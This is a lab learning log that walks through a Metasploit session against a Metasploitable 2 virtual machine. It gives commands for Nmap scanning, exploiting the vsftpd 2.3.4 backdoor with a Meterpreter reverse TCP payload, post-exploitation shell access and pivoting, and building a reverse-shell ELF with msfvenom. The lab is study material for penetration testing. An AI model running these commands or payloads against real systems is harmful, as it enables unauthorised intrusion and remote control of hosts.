## Technical Log

### Part 1 — Metasploit architecture and module types

**Step 1 — What is Metasploit?**

Metasploit Framework is a modular penetration testing platform. It separates the attack workflow into reusable components:
- **Exploit modules** — code that takes advantage of a specific vulnerability
- **Payloads** — code delivered after exploitation, such as a shell or Meterpreter session
- **Auxiliary modules** — scanners, fuzzers, brute-forcers, and other non-exploit actions
- **Post modules** — follow-on actions executed inside an established session
- **Encoders / NOPs** — help obfuscate payloads and avoid detection

This modular design means the same payload can be used with many exploits, and the same exploit can deliver different payloads.

### Part 2 — Lab setup and target reconnaissance

**Step 2 — Confirm the lab target**

I used Metasploitable 2 in VirtualBox on a host-only network. This is the safest way to learn exploitation without putting any real systems at risk.

**Step 3 — Scan the target with Nmap**

Before using Metasploit, I ran Nmap to identify open services and versions.

```bash
nmap -sV -p 21,22,80,139,445,3306 192.0.2.10
```

This revealed services like vsFTPd, SSH, Apache, SMB, and MySQL. The most useful data for Metasploit is the exact service name and version.

**Step 4 — Start msfconsole and load the database**

`msfconsole` is the primary Metasploit interface. I started it and created a fresh workspace:

```bash
msfconsole
workspace -a metasploit_lab
workspace metasploit_lab
```

Then I imported the Nmap scan results directly into Metasploit:

```bash
db_nmap -sV 192.0.2.10
hosts
services
```

Using `db_nmap` keeps Metasploit aware of discovered hosts and services, which makes later exploitation easier.

### Part 3 — Searching and selecting modules

**Step 5 — Search for an exploit**

With the target services known, I used `search` to find relevant exploits.

```bash
search name:vsftpd
search type:exploit platform:unix
```

This returned `exploit/unix/ftp/vsftpd_234_backdoor`, a known backdoor in older vsFTPd versions.

**Step 6 — Inspect module options**

I loaded the exploit module and checked its parameters.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
show options
show targets
show payloads
```

Important options for this module were:
- `RHOSTS` — target IP address
- `RPORT` — target port (default 21)
- `PAYLOAD` — the payload to deliver
- `LHOST` — local callback IP for reverse connections
- `LPORT` — local listener port

### Part 4 — Payloads and exploitation

**Step 7 — Set payload and exploit settings**

I chose a Meterpreter reverse TCP payload for the Linux target.

```bash
set RHOSTS 192.0.2.10
set RPORT 21
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.0.2.1
set LPORT 4444
set VERBOSE true
```

**Step 8 — Launch the exploit**

Then I executed the module:

```bash
exploit
```

The exploit succeeded and opened a Meterpreter session.

### Part 5 — Working with Meterpreter sessions

**Step 9 — List and interact with sessions**

I verified the active session and interacted with it.

```bash
sessions -l
sessions -i 1
```

Inside Meterpreter, I ran basic reconnaissance:

```bash
sysinfo
getuid
pwd
ls
```

I also launched a shell to see lower-level system behavior:

```bash
shell
uname -a
id
exit
```

**Step 10 — Post-exploitation basics**

From an active Meterpreter session, I explored post modules:

```bash
background
use post/multi/manage/autoroute
set SESSION 1
run
```

The `autoroute` module adds routing for pivoting through the compromised host to internal networks.

### Part 6 — Auxiliary scanning and workflow variety

**Step 11 — Use auxiliary modules for reconnaissance**

Metasploit is not only about exploitation. I also used auxiliary scanners:

```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.0.2.10
run
```

This confirmed the FTP service version and demonstrated how Metasploit can replace or supplement Nmap scans.

**Step 12 — Create a payload with msfvenom**

I used `msfvenom` to generate a standalone payload file and saw how payload generation works outside the console.

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.0.2.1 LPORT=4444 -f elf -o shell.elf
```

This produced an ELF binary that could be uploaded to a Linux target in a real engagement.

### Part 7 — Core Metasploit commands learned

- `msfconsole` — start the main interactive Metasploit session
- `workspace -a <name>` — create a named workspace for organized testing
- `db_nmap` — import scan results directly into the Metasploit database
- `search` — find modules by name, platform, or type
- `use <module>` — load an exploit, auxiliary, or post module
- `show options` / `show payloads` / `show targets` — inspect module requirements
- `set <option> <value>` — configure a module
- `exploit` — execute the loaded module
- `sessions -l` / `sessions -i <id>` — manage active sessions
- `background` — return to the console without killing the session
- `run` — execute a post module against a session
- `msfvenom` — generate payloads outside the console

## Challenge Encountered

> **Error / Obstacle:** The initial exploit attempt failed because the payload's `LHOST` was set to the host-only address of the VM host, not the Metasploit listener interface.

**Root cause:** In a host-only lab, the attacker machine has multiple IPs. Metasploit needs the one reachable by the target, not the loopback or wrong physical interface.

**Resolution:**
1. Verified the correct host-only IP with `ip addr show`.
2. Updated `set LHOST 192.0.2.1` to the reachable host-only address.
3. Re-ran the exploit and confirmed the Meterpreter session.

> **Key realization:** In Metasploit, the correct callback interface is critical. A successful exploit can still fail if the payload cannot call back to the attacker.

---

## Resolution

- Used `db_nmap` to import target discovery into Metasploit
- Practiced `search`, `use`, `show options`, and `set` workflows
- Established a Meterpreter session and performed `sysinfo` and `shell`
- Tried both exploit modules and auxiliary scanning modules
- Used `msfvenom` to generate a payload binary outside of `msfconsole`

## Key Takeaways

- **Metasploit is modular.** Exploits, payloads, auxiliary scanners, and post modules are separate pieces that can be combined in many ways.
- **Command fluency matters.** `search`, `use`, `show options`, `set`, and `exploit` are the foundational commands for any Metasploit workflow.
- **Workspace and database integration are powerful.** `db_nmap` and named `workspace`s keep reconnaissance and exploitation data organized.
- **Payload callbacks are the weak link.** If `LHOST` or `LPORT` are wrong, the exploit may appear to succeed but the session will never connect.
- **Metasploit is more than payload delivery.** Auxiliary modules provide reconnaissance and the post module ecosystem allows early pivoting and information gathering.
